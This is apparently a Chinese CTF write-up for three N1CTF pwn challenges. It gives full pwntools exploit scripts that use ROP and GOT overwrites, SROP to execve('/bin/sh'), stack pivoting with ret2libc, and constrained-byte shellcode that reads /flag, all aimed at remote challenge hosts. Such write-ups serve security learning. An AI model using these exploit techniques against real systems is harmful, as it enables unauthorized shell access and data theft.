---
title: N1CTF 部分WP
published: 2026-01-31
description: "只写出来了3道题"
image: ''
tags: [PWN，CTF]
category: PWN
draft: false
---
# pwn


## onlyfgets

magic gadgets:

```perl
0x00000000004010ae : add bl, dh ; endbr64 ; ret

0x000000000040114c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
```

`add bl, dh`用来修改ebx，为`add dword ptr [rbp - 0x3d], ebx`铺垫

之后就`pop rbx	+	add dword ptr [rbp - 0x3d], ebx`来修改got表的内容

直接把libc.so.6扔进ida中看汇编，按0x20字节写正则过滤，

找了半天，发现`ssignal`可以改成`call sigreturn`,`alarm`可以改成`call execve`

然后SROP控制寄存器，RIP改成`call execve`

EXP：

```python
from pwn import *

filename = './onlyfgets'
context.arch='amd64'
context.log_level = "debug"
local = 1
elf = ELF(filename)
libc = ELF("./libc.so.6")
#io=process(filename) 
io=remote('154.94.237.159',34286) 

pop_rdi = 0x4011fc
xor_rbx_ret = 0x4011FE
add_rbx_rdx_ret = 0x4010ae
magic = 0x40114c
pop_rbp = 0x40114d
srop = 0x4011C3
ret = 0x40101a
bss = 0x404500

#修改为call execve
payload = flat([b'a'*0x28,add_rbx_rdx_ret,add_rbx_rdx_ret,add_rbx_rdx_ret,add_rbx_rdx_ret,
                pop_rbp,0x404065,magic,magic,elf.sym['main']
                ])

# io.sendline(payload)
#修改为SROP
payload = flat([b'a'*0x28,add_rbx_rdx_ret,add_rbx_rdx_ret,add_rbx_rdx_ret,add_rbx_rdx_ret,add_rbx_rdx_ret,add_rbx_rdx_ret,
                pop_rbp,0x404018+0x3d,magic,magic,magic,magic,magic,magic,magic,magic,magic,magic,magic,magic,magic,magic,magic,elf.sym['main']
                ])
# gdb.attach(io)

io.sendline(payload)

payload = flat([b'a'*0x28,xor_rbx_ret,add_rbx_rdx_ret,add_rbx_rdx_ret,add_rbx_rdx_ret,add_rbx_rdx_ret,
                pop_rbp,0x404065,magic,magic,elf.sym['main']
                ])
io.sendline(payload)


payload = flat([b'a'*0x20,bss-0x20,0x4011DD])
io.sendline(payload)

sigret_frame = SigreturnFrame()

sigret_frame.r15 = bss-0x40
sigret_frame.rsi = 0
sigret_frame.rdx = 0
sigret_frame.rsi = 0x404a00 
sigret_frame.rcx = 0x404a00 
# sigret_frame.rsp = 0x4011CD
sigret_frame.rsp = 0x4011CD
sigret_frame.eflags = 0x33

payload = flat([b'/bin/sh\x00',b'a'*0x18,ret,ret,srop,sigret_frame])
io.sendline(payload)




io.interactive()
```

## ez_canary

1. 如果一开始就进入gift的话无法通过canary检验
2. 看一下buf的位置`  __int64 buf_; // [rsp+30h] [rbp+0h] BYREF`,可以直接覆盖rbp和ret_addr
3. 通过`read(0, &buf_, 0x10u);`调用gift中的read修改`__stack_chk_fail.got`
4. 要注意我们修改的时候要进行栈迁移，不能修改read和puts的got表，从`0x404020 setsockopt `开始可以满足我们栈迁移的要求
5. 将`__stack_chk_fail.got`修改为ret即可，栈迁移到0x404a00打ret2libc



```python
from pwn import *
import sys

context.log_level = 'debug'
context.arch = 'amd64'
binary_path = './server'
libc = ELF("./libc-2.31.so")

elf = ELF(binary_path)
gift = 0x401451
stack_fail_got = elf.got['__stack_chk_fail']
read = 0x40156E
leave_ret = 0x40147C
pwn_hander = 0x40147E
pop_rdi = 0x401893
pop_rsi_r15 = 0x401891
ret = 0x40101a
pop_rbp = 0x40141d
gdb_script = '''
set follow-fork-mode child
b *0x40143E
b pwn_handler
b *0x401583
c
'''



def pwn():
    # time.sleep(1)
    p = remote("60.205.163.215",10127)
    p.recvuntil(b"functions?")
    p.sendline(b"2")

    fake_rbp = stack_fail_got + 0x20
    
    payload1 = flat([
        fake_rbp,    
        gift      
    ])
    p.send(payload1) 
    
    payload2 = flat([ret,gift])
    p.send(payload2)

    payload2 = flat([ret,ret,ret,ret,ret,ret,ret,pop_rbp,0x404a00,gift])
    p.send(payload2)
    pause()
    payload3 = flat([b'a'*0x30,ret,ret,ret,pop_rdi,elf.got['puts'],elf.plt['puts'],pop_rbp,0x404a00,gift,0x404a00])
    p.sendline(payload3)
    
    p.recvuntil('This is canary!')

    
    
    p.recvuntil(b"[Server]: ")
    put_addr = u64(p.recvuntil(b'\n', drop=True).ljust(8,b'\x00'))
    # put_addr = u64(p.recvuntil("\n",drop = 1).ljust(8,b'\x00'))
    log.success(f'puts ==> {hex(put_addr)}')
    libc.address = put_addr - libc.sym['puts']
    log.success(f'libc ==> {hex(libc.address)}')
    
    payload4 = flat([b'a'*0x30,ret,ret,ret,ret,pop_rdi,libc.search(b'/bin/sh').__next__(),libc.symbols['system']])
    p.sendline(payload4)
    
    p.interactive()
    # io.interactive()

if __name__ == '__main__':
    pwn()
```

## shellcode

题目要求：

两轮运行：需提交两段 Shellcode。

字节隔离：Round 2 的字节集不能包含 Round 1 用过的任何字节。

总量限制：两轮使用的唯一字节种类总和 < 16

直接写 ORW 无法满足限制。解法是编写两段 "Builder"，利用极少的指令在内存中算出并写入真正的 Payload，然后滑行执行。

### 核心 Payload (通用)

由于 `rsp=0`，必须先修复栈指针。利用 `rdx` (R1) 或 `add rax, rdx` (R2) 恢复出的指针：

代码段

```
mov rsp, rdx      ; 恢复栈底
add rsp, 0x1000   ; 栈平衡到安全区
/* ... 标准 Open/Sendfile ... */
```

## 3. 字节集构造

### Builder A (基于加法)

**字节集 (6种)**: `{fe, c0, 00, 02, c2, c6}`

逻辑:

- `inc al` / `add al, al` : 凑出 Payload 字节。
- `add [rdx], al` : 写入内存。
- `inc dl` : 移动指针。

### Builder B (基于异或)

**字节集 (9种)**: `{30, 18, 80, c3, c4, 01, 04, 48, d0}`

逻辑:

- `add rax, rdx` (`48 01 d0`): 关键修复。
- `add bl, IMM` : 凑数。
- `xor [rax], bl` : 写入内存。
- `add al, 1` : 移动指针。

```python

from pwn import *
import collections

context.arch = 'amd64'

def get_shortest_path_a(start_val, target_val):
    queue = collections.deque([(start_val, b"")])
    visited = {start_val}
    while queue:
        curr, path = queue.popleft()
        if curr == target_val: return path
        nxt_double = (curr * 2) & 0xFF
        if nxt_double not in visited:
            visited.add(nxt_double)
            queue.append((nxt_double, path + b'\x00\xc0'))
        nxt_inc = (curr + 1) & 0xFF
        if nxt_inc not in visited:
            visited.add(nxt_inc)
            queue.append((nxt_inc, path + b'\xfe\xc0'))
    return b""

def get_shortest_path_b(start_val, target_val):
    allowed_imms = [0x30, 0x18, 0x80, 0xc3, 0xc4, 0x01, 0x04, 0x48, 0xd0]
    queue = collections.deque([(start_val, b"")])
    visited = {start_val}
    while queue:
        curr, path = queue.popleft()
        if curr == target_val: return path
        for imm in allowed_imms:
            nxt = (curr + imm) & 0xFF
            if nxt not in visited:
                visited.add(nxt)
                queue.append((nxt, path + b'\x80\xc3' + bytes([imm])))
    return b""
=
def exploit():
    print("[*] Generating Final Shellcodes...")
    GAP_SIZE = 0x800 
    
    payload_asm = f"""
        mov rsp, rdx      /* Safe Stack Pivot */
        add rsp, 0x1000   /* Skip ahead to safe area */
        
        /* open("/flag", 0) */
        mov rax, 0x67616c662f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        mov eax, 2
        syscall
        
        /* sendfile(1, fd, 0, 100) */
        mov rsi, rax
        mov rdi, 1
        xor rdx, rdx
        mov r10, 100
        mov eax, 40
        syscall
        
        /* exit */
        mov eax, 60
        syscall
    """
    payload = asm(payload_asm)

    builder_a = b'\xfe\xc6' * 8 # rdx += 2048
    current_val = 0
    for byte in payload:
        builder_a += get_shortest_path_a(current_val, byte)
        current_val = byte
        builder_a += b'\x00\x02' + b'\xfe\xc2'
    while len(builder_a) < GAP_SIZE:
        builder_a += b'\xfe\xc0'

    builder_b = b'\x48\x01\xd0' 
    

    builder_b += b'\x80\xc4\x08' 
 
    builder_b = b'\x48\x01\xd0' + (b'\x80\xc4\x01' * 8)
    
    current_val = 0
    for byte in payload:
        builder_b += get_shortest_path_b(current_val, byte)
        current_val = byte
        builder_b += b'\x30\x18' + b'\x04\x01'
        

    needed = GAP_SIZE - len(builder_b)
    if needed % 2 != 0: builder_b += b'\x80\xc3\x01'
    while len(builder_b) < GAP_SIZE: builder_b += b'\x04\x01'

    set_a = set(builder_a)
    set_b = set(builder_b)
    print(f"Set A ({len(set_a)}): {[hex(x) for x in set_a]}")
    print(f"Set B ({len(set_b)}): {[hex(x) for x in set_b]}")
    
    if len(set_a & set_b) > 0:
        print("[-] CONFLICT: Sets intersect!", set_a & set_b)
        return
    if len(set_a | set_b) >= 16:
        print(f"[-] ERROR: Too many unique bytes! ({len(set_a | set_b)})")
        return

    print("[+] Check passed. Sending...")
    try:
        # p = process(['python3', 'chal.py']) # 本地
        p = remote('60.205.163.215', 49715) # 远程
        
        p.recvuntil(b'hex(0/2):')
        print("[*] Sending Round 1...")
        p.sendline(builder_a.hex().encode())
        
        p.recvuntil(b'hex(1/2):')
        print("[*] Sending Round 2...")
        p.sendline(builder_b.hex().encode())
        
        p.interactive()
    except Exception as e:
        print(e)

if __name__ == "__main__":
    exploit()
```

